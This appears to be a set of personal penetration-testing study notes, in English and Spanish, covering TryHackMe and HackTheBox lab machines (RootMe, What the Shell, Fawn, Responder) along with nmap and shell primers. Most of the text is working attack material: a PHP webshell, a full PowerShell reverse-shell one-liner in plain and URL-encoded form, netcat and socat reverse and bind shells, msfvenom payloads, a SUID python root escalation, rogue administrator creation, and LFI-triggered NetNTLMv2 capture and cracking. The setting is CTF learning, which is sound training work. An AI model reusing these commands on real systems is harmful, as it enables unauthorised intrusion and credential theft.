Room : Rootme
IP: 10.10.XXX.XXX


***** Reconnaissance ****** 
nmap -sV $TARGET
nmap -sC -sV -oA rootme.txt $TARGET
gobuster dir --url http://10.10.213.202/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

**** Getting a shell *****
Upload a file to get a shell (rename if needed)

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

update ip address and port
ip = tun0 (vpn)
port = 1234

then listen..
nc -l -v -n -p 1234 and get the shell

to update the shell: 
python -c "import pty; pty.spawn('/bin/bash')"

find / -type f -name user.txt 2>/dev/null

****** Privilege escalation ******
Search for files with SUID permission
find / -type f -perm -4000 2>/dev/null

GTFOBins
https://gtfobins.github.io/
cd /usr/bin
and execute: 
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

whoami
root


https://github.com/Hunterdii/tryhackme-free-rooms?tab=readme-ov-file#recon

Room : What the shell

Practice

-- Windows Server
* Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

nano shell.php
<?php echo "<pre>" .shell_exec($_GET["cmd"]) "</pre>"?>

upload shell.php and navigate to that file
if everythong is OK we should get the following message:

Notice: Undefined index: cmd in C:\xampp\htdocs\uploads\shell.php on line 1

Warning: shell_exec(): Cannot execute a blank command in C:\xampp\htdocs\uploads\shell.php on line 1

establish a listener on the attack machine
nc -lvnp 4545

use any of these powershell commands to get a reverse shell:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<attacker_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Important:
add attacker_ip and attacker_port (vpn tun0)
encode the command (https://www.urlencoder.org/)

after encoding it should be something like this: 
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.8.11.143%27%2C445%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

we should paste this on the url after =
http://10.10.125.120/uploads/shell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.8.11.143%27%2C445%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

We finally should get the reverse shell: 
──(kali㉿kali)-[~/CTFs/THM/WhatTheShell]
└─$ nc -lvnp 445 
listening on [any] 445 ...
connect to [10.8.11.143] from (UNKNOWN) [10.10.125.120] 50103
PS C:\xampp\htdocs\uploads>

* The webserver is running with SYSTEM privileges. Create a new user and 
add it to the "administrators" group, then login over RDP or WinRM.

Once we got the reverse shell: 
PS C:\xampp\htdocs\uploads>net user alex alexpass /add
PS C:\xampp\htdocs\uploads>net user localgroup administrators alex /add

Log out and log in again using recently creds:
xfreerdp3 /dynamic-resolution /clipboard /v:<TARGET_IP> /u:user /p:'password'

* Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

NETCAT 
>> reverse shell (you let the machine connect to you)

from attacker machine execute:
nc -lvnp <listening port>
nc -lvnp 4545 (listener)

from target machine open a cmd and execute: 
nc <ATTACKER_IP_tun0> <ATTACKER_PORT> -e "cmd.exe"
nc 10.8.11.143 445 -e "cmd.exe"

>> bind shell (you connect to the machine, requires bypass firewall, requieres port used to be opened in fw)
from the attacker machine execute:
nc 10.8.11.143 4545 

from target machine execute:
nc -lvnp 4545 -e "cmd.exe"

SOCAT (more stable shell)
>> Reverse shells (you let the machine to connect to you)

attacker machine (kali linux)
socat TCP-L:<port> - (listener)
socat TCP-L:4545 

target machine
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes (connect)
("pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.)

socat TCP:10.8.11.143:4545 EXEC:powershell.exe,pipes 


>> Bind Shells (you connect to the machine)

attacker machine (kali linux)
socat TCP:<TARGET-IP>:<TARGET-PORT> -  (connect)
socat TCP:10.8.11.143:4545 - 

target machine
socat TCP-L:<PORT> EXEC:powershell.exe,pipes (listen)
socat TCP-L:4545 EXEC:powershell.exe,pipes 


MSVENOM.METASPLOIT.MULTI/HANDLER
* Create a 64bit Windows Meterpreter shell using msfvenom and upload it to
 the Windows Target. Activate the shell and catch it with multi/handler.
 Experiment with the features of this shell.
 
To generate a Windows x64 Reverse Shell in an exe format, we could use:

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.8.11.143 LPORT=4545

this will create a shell.exe file which should be uploaded to the machine, we can use file upload from web or either copy+paste from local to Windows machine.

then run msfconsole > use multi/handler
set LHOST 10.8.11.143 (tun0 ip)
set LPORT 4545
set payload windows/x64/shell/reverse_tcp
run (listening...)

on the target machine execute shell.exe to get the reverse shell.
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.8.11.143:4545 
[*] Sending stage (336 bytes) to 10.10.114.161
[*] Command shell session 1 opened (10.8.11.143:4545 -> 10.10.114.161:50072) at 2025-03-09 20:04:31 +0100


Shell Banner:
Microsoft Windows [Version 10.0.17763.1637]
-----
          

C:\Users\Administrator\Desktop>

* Create both staged and stageless meterpreter shells for either target. 
Upload and manually activate them, catching the shell with netcat -- does this work?

Staged vs. Stageless Payloads:
Staged payloads are delivered in two parts: a small "stager" that connects to a listener and downloads the main payload. They are harder to detect initially but require specialized listeners (e.g., Metasploit multi/handler). 

Stageless payloads are self-contained, sending a reverse shell immediately. They are easier to deploy but bulkier and more detectable by antivirus software.
Modern antivirus tools, using AMSI, can detect staged payloads in memory, reducing their effectiveness.

stageless (no need to use multi/handler with stageless payloads)

msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.8.11.143 LPORT=4545

upload shell.exe to machine

on attacker machine: 
nc -lvnp 4545

and then execute shell.exe, we should get the machine connect to us, thus the reverse shell

┌──(kali㉿kali)-[~/CTFs/THM/WhatTheShell]
└─$ nc -lvnp 4545                    
listening on [any] 4545 ...
connect to [10.8.11.143] from (UNKNOWN) [10.10.114.161] 50156
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>


Practice
-- Linux server (Ubuntu)
* Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.

shell.php
<?php echo shell_exec($_GET['cmd']); ?>

we upload it from the web

from our kali machine (attacker machine) we start listening by executing: 
nc -lvnp 4545

then, from the browser we execute: 
http://10.10.184.198/uploads/shell.php?cmd=nc 10.8.11.143 4545 -e /bin/bash

and we get the reverse shell: 
┌──(kali㉿kali)-[~/CTFs/THM/WhatTheShell]
└─$ nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.8.11.143] from (UNKNOWN) [10.10.184.198] 49768
whoami
www-data
pwd
/var/www/html/uploads
ls
php-reverse-shell.php
shell.php

* Navigate to /usr/share/webshells/php/php-reverse-shell.php 
in Kali and change the IP and port to match your tun0 IP with a custom 
port. Set up a netcat listener, then upload and activate the shell.

we upload it from the web


from our kali machine (attacker machine) we start listening by executing: 
nc -lvnp 4545

execute php-reverse-shell.php and we will get the reverse shell into our kali machine: 

┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.8.11.143] from (UNKNOWN) [10.10.184.198] 49770
Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:19:28 up 53 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@linux-shell-practice:/$


* Log into the Linux machine over SSH using the credentials in task 14. 
Use the techniques in Task 8 to experiment with bind and reverse netcat 
shells.

 >> reverse shell (you let the machine to connect to you)
In out kali machine open to tabs, one for the listener and the other one for ssh connection: 

listener (attacker):
nc -lvnp 4545

ssh (target): 
ssh shell@<TARGET_IP>

once in, execute: 
shell@linux-shell-practice:~$ nc 10.8.11.143 4545 -e /bin/bash

and then we get the reverse shell: 
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.8.11.143] from (UNKNOWN) [10.10.184.198] 49772
whoami
shell

>> bind shell (we connect to the target machine)

ssh (listen on target): 
ssh shell@<TARGET_IP>

shell@linux-shell-practice:~$ nc -lvnp 4545

attacker:
nc 10.10.184.198 4545 -e /bin/bash

and then we get: 

shell@linux-shell-practice:~$ nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.10.184.198] from (UNKNOWN) [10.8.11.143] 46180
whoami
kali

* Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

SOCAT
>> reverse shell

on kali machine (attacker)
socat TCP-L:<port> -
socat TCP-L:4444 -

on target machine: 
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
socat TCP:10.8.11.143:4444 EXEC:"bash -li"

once we execute this, we get the shell

>> bind shell 

on the target machine: 
socat TCP-L:<PORT> EXEC:"bash -li"
socat TCP-L:4444 EXEC:"bash -li", for example

and then on the attacker machine: 
socat TCP:<TARGET-IP>:<TARGET-PORT> -
socat TCP:10.10.184.198:4444 -

-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
python3 -c "import pty; pty.spawn('/bin/bash')”

Step 1. Install required packages.
Before installing  VirtualBox Guest Additions on Kali Linux we need to install some required packages. So open the terminal and run the following command.

sudo apt install linux-headers-$(uname -r) build-essential dkms

Step 2. Install Guest Additions using virtual box.
In order To install VirtualBox Guest Additions on Kali Linux virtual machine, Got to VirtualBox  -  select the Devices from VirtualBox host application menu - click Insert Guest Additions CD image.

Step 3.
cp /media/cd-rom/VBoxLinuxAdditions.run / root /
chmod 755 /root/VBoxLinuxAdditions.run
cd / root
./VBoxLinuxAdditions.run

Step 5. Start Kali Linux virtual machine and check if copy and paste works.
Finish

Resumen del Proceso de Pentesting en Cinco Pasos

1. Enumeración (Footprinting):
En esta primera fase inicial de enumeración, también llamada Footprinting, pues el objetivo principal es recopilar información sobre el objetivo seleccionado. Esto pues, puede incluir la identificación de diversos sistemas operativos, puertos abiertos, servicios corriendo en esos puertos o las distintas tecnologías que están siendo utilizadas en la infraestructura del objetivo. Esta fase también incluiría recopilar datos como direcciones IP, nombres de dominio, contactos de organización y cualquier otra información relevante que nos pueda ayudar en las etapas posteriores.
    - Objetivo: Recopilar información sobre el objetivo.
    - Actividades: Identificación de sistemas operativos, puertos abiertos, servicios activos, tecnologías usadas, direcciones IP, nombres de dominio y contactos organizacionales.
    
    Herramientas:
    
    → nmap (escaneo de puertos, servicios, SO, tecnologías, nombres de dominio, usuarios, direcciones IP)
    
    →
    
2. Fuzzing de Directorios:
Se trata de una técnica de prueba automatizada que consiste en enviar peticiones con datos específicos a través, por ejemplo, de un diccionario, hacia una aplicación o sistema con el objetivo de identificar vulnerabilidades. Sobre todo, utilizaremos esta técnica para encontrar archivos y directorios ocultos en una máquina o subdominios del host principal. Esto sirve pues, por ejemplo, para encontrar pantallas de login o registro o diversa información sensible, como archivos y credenciales ocultas.
    - Objetivo: Identificar vulnerabilidades enviando peticiones automatizadas.
    - Actividades: Utilizar diccionarios para encontrar archivos y directorios ocultos, subdominios, pantallas de login, y credenciales sensibles.
3. Búsqueda de Exploits:
Vamos a buscar exploits que se encuentren públicamente en Internet o a desarrollar nuestros propios scripts para aprovechar vulnerabilidades descubiertas en la fase de enumeración. Y para ello vamos a utilizar bases de datos de exploits, foros de seguridad y otras fuentes de información para identificar herramientas y técnicas que podríamos utilizar para comprometer directamente al objetivo.
    - Objetivo: Encontrar o desarrollar exploits para vulnerabilidades descubiertas.
    - Actividades: Usar bases de datos de exploits, foros de seguridad y otras fuentes para identificar herramientas y técnicas para comprometer el objetivo.
4. Ganar Acceso a la Máquina:
El 4.º paso sería ganar acceso a la máquina, y es que una vez identificadas y aprovechadas las vulnerabilidades, procederemos a obtener un acceso no autorizado al sistema. Esto puede implicar la ejecución de código malicioso, la manipulación de credenciales de acceso o la explotación de backdoors previamente instalados en el sistema objetivo. El objetivo de esta fase es establecer un punto de acceso al sistema para permitirnos obtener el user flag, que es un archivo de texto que en este caso se llama user txt, que es una cadena de texto que debemos entregar como prueba de que hemos comprometido la máquina.
    - Objetivo: Obtener acceso no autorizado al sistema.
    - Actividades: Ejecutar código malicioso, manipular credenciales o explotar backdoors para obtener el "user flag" (user.txt) como prueba de compromiso.
5. Elevación de Privilegios:
Y la última fase sería la fase de elevación de privilegios, ya que una vez que hemos accedido al sistema entramos como un usuario sin privilegios y el objetivo es conseguir aumentar nuestros privilegios dentro del entorno, lo que nos va a permitir un mayor nivel de control sobre el sistema. El objetivo en este punto es conseguir el root flag, también llamado root, que es un documento que se encuentra en la carpeta root y al que solo podemos acceder elevando nuestros privilegios. Una vez conseguido, pues podríamos realizar cualquier acción que queramos dentro del sistema objetivo.
    - Objetivo: Aumentar los privilegios dentro del sistema.
    - Actividades: Elevar privilegios para conseguir el "root flag" (root.txt), permitiendo un mayor control sobre el sistema y realizar cualquier acción dentro del mismo.

Glosario de Jerga de Hacking

- Enumeración (Footprinting): Proceso de recopilar información detallada sobre un objetivo para identificar posibles puntos de entrada.
- Fuzzing de Directorios: Técnica automatizada de prueba que envía peticiones con datos específicos para encontrar vulnerabilidades y recursos ocultos.
- Exploit: Software o script que aprovecha una vulnerabilidad en un sistema para ejecutar acciones no autorizadas.
- Backdoor: Método secreto de eludir la autenticación normal para acceder a un sistema, a menudo dejado por atacantes.
- User Flag: Archivo de texto (user.txt) que sirve como prueba de que se ha comprometido una máquina, generalmente accesible por un usuario sin privilegios elevados.
- Root Flag: Archivo de texto (root.txt) que sirve como prueba de que se ha obtenido acceso completo (root) a una máquina.
- Elevación de Privilegios: Técnica utilizada para obtener mayores niveles de acceso dentro de un sistema, permitiendo control total sobre el mismo.
- Sistemas Operativos: Software que gestiona el hardware y software de una computadora.
- Puertos Abiertos: Puntos de acceso en un sistema que permiten la comunicación con otros dispositivos o redes.
- Servicios Activos: Aplicaciones o procesos que están ejecutándose en un sistema y que pueden ofrecer puntos de entrada para un atacante.
- Direcciones IP: Identificadores únicos para dispositivos en una red.
- Nombres de Dominio: Nombres legibles por humanos que corresponden a direcciones IP, facilitando el acceso a servicios en Internet.
- Credenciales: Información de autenticación, como nombres de usuario y contraseñas, utilizadas para acceder a sistemas y servicios.
- Subdominios: Dominios secundarios que son parte de un dominio principal, a menudo utilizados para organizar servicios o secciones de un sitio web.

Fawn Write-up

Prepared by: 0ne-nine9

Introduction

This exercise focuses on familiarizing with the File Transfer Protocol (FTP),
which is commonly used for file transfers but can be misconfigured easily.
Misconfigurations can lead to security vulnerabilities, allowing unauthorized access
to files, logs, and potentially sensitive information. This write-up demonstrates
the process of exploiting a misconfigured FTP service.

Enumeration

1. Check VPN Connection:

Use the `ping` command to verify connectivity to the target.
ping {target_IP}

Example result:
PING {target_IP} ({target_IP}) 56(84) bytes of data.
64 bytes from {target_IP}: icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from {target_IP}: icmp_seq=2 ttl=64 time=0.055 ms

Cancel the ping command with `CTRL+C` once connectivity is confirmed.

Comments:

- `{target_IP}` should be replaced with the actual IP address of the target machine.
- In large-scale corporate environments, firewalls might block ping requests.
1. Scan for Open Services:

Use `nmap` to scan for open ports and services.
nmap {target_IP}

Example result:
Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org/) ) at 2023-10-04 10:18 UTC
Nmap scan report for {target_IP}
Host is up (0.00020s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
21/tcp open  ftp

To detect service versions, use:
nmap -sV {target_IP}

Example result:
Starting Nmap 7.80 ( [https://nmap.org](https://nmap.org/) ) at 2023-10-04 10:20 UTC
Nmap scan report for {target_IP}
Host is up (0.00020s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3

Comments:

- The `sV` switch enables version detection, which provides more detailed information about the running services.

Foothold

1. Access FTP Service:

Ensure `ftp` is installed and up-to-date.
sudo apt-get install ftp -y
ftp -?

Example result:
Usage: ftp [OPTION]... [HOST]...
Send and receive file(s) from HOST

Connect to the FTP service.
ftp {target_IP}

Example result:
Connected to {target_IP}.
220 (vsFTPd 3.0.3)

Log in using the `anonymous` account with any password.
Name ({target_IP}:{your_username}): anonymous
331 Please specify the password.
Password: (enter any password)
230 Login successful.

Comments:

- The `y` switch in the `apt-get install` command automatically accepts the installation prompts.
- Logging in as `anonymous` is a common misconfiguration that allows access without proper credentials.
1. List and Download Files:

List directory contents.
ls

Example result:
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Mar 26  2023 files
-rw-r--r--    1 0        0              14 Mar 26  2023 flag.txt
226 Directory send OK.

Download the `flag.txt` file.
get flag.txt

Example result:
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (14 bytes).
226 Transfer complete.
14 bytes received in 0.00 secs (32.9732 kB/s)

To view the contents of the file, use:
more flag.txt

Exit the FTP service and verify the downloaded file on your host.

Example command to exit:
bye

Example result:
221 Goodbye.

Comments:

- The `ls` command lists the files in the current directory.
- The `get` command downloads the specified file from the remote server to your local machine.
- The `more` command can be used to view the contents of the file.

Commands Reference:

ping {target_IP}: Check connectivity to the target.
nmap {target_IP}: Basic scan for open ports and services.
nmap -sV {target_IP}: Scan with version detection.
sudo apt-get install ftp -y: Install FTP client.
ftp -?: Verify FTP client installation.
ftp {target_IP}: Connect to FTP service.
ls: List files in the directory.
get flag.txt: Download the specified file.
more flag.txt: View the contents of the file.

Conclusion

By following these steps, you can successfully exploit a misconfigured FTP service, demonstrating
the importance of securing such services to prevent unauthorized access and potential data breaches.

Comments:

- Replace placeholders (e.g., `{target_IP}`) with actual values specific to the environment you are working in.
- Ensure you have the necessary permissions and legal authorization before performing any penetration testing activities.

HTB Responder
Fases del Pentesting
Reconocimiento (Footprinting)
Nmap: Utilizado para escaneo inicial de puertos y enumeración de servicios.
Enumeración del sitio web: Identificación del uso de virtual hosting y la necesidad de modificar el archivo /etc/hosts.

Escaneo y Enumeración
Análisis del sitio web: Descubrimiento de la opción de selección de idioma y el parámetro "page" potencialmente vulnerable.
Prueba de vulnerabilidad de inclusión de archivos local (LFI).

Obtención de Acceso Inicial (Foothold)
Explotación de la vulnerabilidad LFI para incluir archivos del sistema.
Responder: Utilizado para capturar el hash NetNTLMv2 explotando la vulnerabilidad de inclusión de archivos.

Escalada de Privilegios
John the Ripper: Empleado para crackear el hash NetNTLMv2 capturado y obtener la contraseña del Administrador.

Movimiento Lateral y Acceso al Sistema
Evil-WinRM: Utilizado para conectarse al servicio WinRM del objetivo usando las credenciales crackeadas y ganar acceso.

Post-Explotación
Navegación por el sistema de archivos para localizar y acceder a la flag en C:\Users\mike\Desktop\flag.txt

Responder Write-up Summary

Introduction
The document outlines a penetration testing scenario where a File Inclusion vulnerability on a Windows-based web server is exploited to capture the NetNTLMv2 hash. Tools used include Responder for capturing the hash and John the Ripper for cracking it.

Steps and Commands

1. Enumeration

Nmap Scan
Purpose: Identify open ports and services.
Command:
nmap -p- --min-rate 1000 -sV 10.129.128.223
Result:
Open ports: 80 (Apache web server), 5985 (WinRM)

1. Website Enumeration

Modify /etc/hosts
Purpose: Resolve unika.htb to the target IP address.
Command:
echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts

Access the Web Page
Purpose: Check for potential vulnerabilities.
URL:
[http://unika.htb](http://unika.htb/)

Check for LFI Vulnerability
Purpose: Exploit Local File Inclusion to read sensitive files.
Test URL:
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

1. Responder Challenge Capture

Clone Responder Repository
Purpose: Ensure Responder is available for use.
Command:
git clone https://github.com/lgandx/Responder

Start Responder
Purpose: Set up Responder to capture SMB authentication attempts.
Command:
sudo python3 [Responder.py](http://responder.py/) -I {network_interface}
Example:
sudo python3 [Responder.py](http://responder.py/) -I tun0

Trigger SMB Authentication
Purpose: Force the target to authenticate to our Responder server by exploiting the LFI vulnerability.
Payload URL:
http://unika.htb/?page=//10.10.14.25/somefile

1. Hash Cracking

Save the Captured Hash
Purpose: Store the captured NetNTLMv2 hash for cracking.
Command:
echo "Administrator::DESKTOP-H3OF232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D801F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E00480045003800440049003400410053004300510004003400570049004E002D004E0048004500380044004900340041005300430051002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C004F00430041004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D801060004000200000008003000300000000000000001000000002000000C2FAF941D04DCECC6A7691EA92630A77E073056DA8C3F356D47C324C6D6D16F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000" > hash.txt

Crack the Hash with John the Ripper
Purpose: Find the plaintext password from the NetNTLMv2 hash.
Command:
john -w=/usr/share/wordlists/rockyou.txt hash.txt
Result:
Password found: badminton

1. Gain Access via WinRM

Use Evil-WinRM
Purpose: Connect to the target machine using the cracked credentials.
Command:
evil-winrm -i 10.129.136.91 -u administrator -p badminton

Retrieve the Flag
Command:
type C:\Users\mike\Desktop\flag.txt

Conclusion
The steps outlined in the document demonstrate how to exploit a Local File Inclusion vulnerability to capture NetNTLMv2 hashes using Responder, crack the hashes using John the Ripper, and ultimately gain access to the target machine using WinRM. This process highlights the importance of securing web applications and properly sanitizing user inputs to prevent such vulnerabilities.



-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-**
Resumen de Herramientas por Fase

1. Reconocimiento:
    - Nmap (nmap -p- -Pn -sV -T5 $TARGET)
    - Modificación de `/etc/hosts` (echo “ip webname.com” | tee a /etc/hosts)
2. Escaneo y Enumeración:
    - Análisis del sitio web (parámetros vulnerables)
    - whatweb
3. Obtención de Acceso Inicial:
    - Explotación de LFI
    - Responder
4. Escalada de Privilegios:
    - John the Ripper
    - john -w=/usr/share/wordlists/rockyou.txt hash_found.txt
5. Movimiento Lateral y Acceso al Sistema:
    - Evil-WinRM evil-winrm -i $TARGET -u administrator -p badminton
6. Post-Explotación:
    - Navegación por el sistema de archivos (comandos de Windows)

-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-**

systemctl list-units type=service

# NMAP: Escaneo Básico de Puertos

## Índice

1. Conceptos Básicos
2. Estados de los Puertos
3. Tipos de Escaneo
4. Opciones y Configuración
5. Ajuste de Tiempo
6. Detección de Servicios y SO
7. Salida y Reportes

---

## Conceptos Básicos

Un puerto TCP o UDP identifica un servicio de red en un host. Algunos ejemplos de puertos y sus servicios comunes:

- **HTTP**: TCP 80
- **HTTPS**: TCP 443
- **SSH**: TCP 22

Los escaneos de puertos permiten identificar qué servicios están en ejecución en un sistema objetivo.

## Estados de los Puertos

Nmap clasifica los puertos en los siguientes estados:

- **Abierto**: Hay un servicio escuchando en el puerto.
- **Cerrado**: No hay servicio escuchando, pero el puerto está accesible.
- **Filtrado**: Nmap no puede determinar su estado debido a un cortafuegos.
- **No filtrado**: El puerto es accesible, pero Nmap no puede determinar su estado.
- **Abierto|Filtrado**: No se puede determinar si el puerto está abierto o filtrado.
- **Cerrado|Filtrado**: No se puede determinar si el puerto está cerrado o filtrado.

## Tipos de Escaneo

### Escaneo TCP Connect (-sT)

Completa el *handshake* de tres vías para verificar si un puerto está abierto.

```
nmap -sT MACHINE_IP
```

### Escaneo TCP SYN (-sS)

No completa la conexión, solo verifica la respuesta SYN/ACK.

```
sudo nmap -sS MACHINE_IP
```

### Escaneo UDP (-sU)

Verifica puertos UDP abiertos. Puede combinarse con TCP:

```
sudo nmap -sU MACHINE_IP
```

### Escaneo de Ping (-sn)

Solo identifica hosts activos sin escanear puertos.

```
nmap -sn MACHINE_IP
```

### Escaneo de Lista (-sL)

Muestra los objetivos sin realizar escaneo.

```
nmap -sL MACHINE_IP
```

## Opciones y Configuración

- **`F`**: Escaneo rápido de los 100 puertos más comunes.
- **`p[rango]`**: Especifica un rango de puertos (ejemplo: `p22,80,443` o `p-` para todos).
- **`Pn`**: Trata todos los hosts como activos, incluso si no responden al ping.
- **`r`**: Escanea los puertos en orden secuencial en lugar de aleatorio.

## Ajuste de Tiempo

- **`T<0-5>`**: Control de velocidad, de más sigiloso (`T0`) a más rápido (`T5`).
- **`-min-rate <número>`** / **`-max-rate <número>`**: Control de velocidad de paquetes por segundo.
- **`-min-parallelism <numprobes>`** / **`-max-parallelism <numprobes>`**: Ajusta la cantidad de sondas simultáneas.
- **`-host-timeout <tiempo>`**: Tiempo máximo de espera para un host.

## Detección de Servicios y SO

- **`O`**: Detecta el sistema operativo del objetivo.
- **`sV`**: Detecta versiones de servicios en los puertos abiertos.
- **`A`**: Escaneo avanzado (equivalente a `O -sV`).

## Salida y Reportes

- **`v`** / **`vv`**: Niveles de verbosidad (más detalles en la salida).
- **`d`**: Nivel de depuración (ejemplo: `d9` para más información).
- **`oN <archivo>`**: Guarda la salida normal en un archivo.
- **`oX <archivo>`**: Guarda la salida en formato XML.
- **`oG <archivo>`**: Guarda la salida en formato grepeable.

### Tipos de Escaneo en Nmap

### Escaneos de Ping

| Tipo de Escaneo | Comando de Ejemplo |
| --- | --- |
| **ARP Scan** | `sudo nmap -PR -sn MACHINE_IP/24` |
| **ICMP Echo Scan** | `sudo nmap -PE -sn MACHINE_IP/24` |
| **ICMP Timestamp Scan** | `sudo nmap -PP -sn MACHINE_IP/24` |
| **ICMP Address Mask Scan** | `sudo nmap -PM -sn MACHINE_IP/24` |
| **TCP SYN Ping Scan** | `sudo nmap -PS22,80,443 -sn MACHINE_IP/30` |
| **TCP ACK Ping Scan** | `sudo nmap -PA22,80,443 -sn MACHINE_IP/30` |
| **UDP Ping Scan** | `sudo nmap -PU53,161,162 -sn MACHINE_IP/30` |

> Nota: Usa -sn si solo necesitas descubrir hosts sin escanear puertos. Si omites -sn, Nmap realizará un escaneo de puertos en los hosts detectados.
> 

### Opciones Adicionales

| Opción | Propósito |
| --- | --- |
| `-n` | No realizar búsquedas DNS |
| `-R` | Realizar búsqueda DNS inversa en todos los hosts |
| `-sn` | Solo descubrir hosts (sin escanear puertos) |

# SHELLS

Una shell wa una interfaz de línea de comandos (como bash o PowerShell). Al atacar sistemas remotos, buscamos obtener un shell en el sistema objetivo aprovechando vulnerabilidades para ejecutar código arbitrario.

## Tipos de Shells

Podemos obligar al servidor remoto a:

- **Enviar acceso a la línea de comandos:** (Shell Inversa o Reverse Shell)
- **Abrir un puerto en el servidor:** (Shell de Enlace o Bind Shell) al que podemos conectarnos para ejecutar comandos.

## Herramientas para Manejar Shells

Existen varias herramientas que podemos utilizar para recibir shells inversas y enviar shells de enlace. En general, necesitamos código malicioso (shellcode) y una forma de interactuar con el shell resultante.

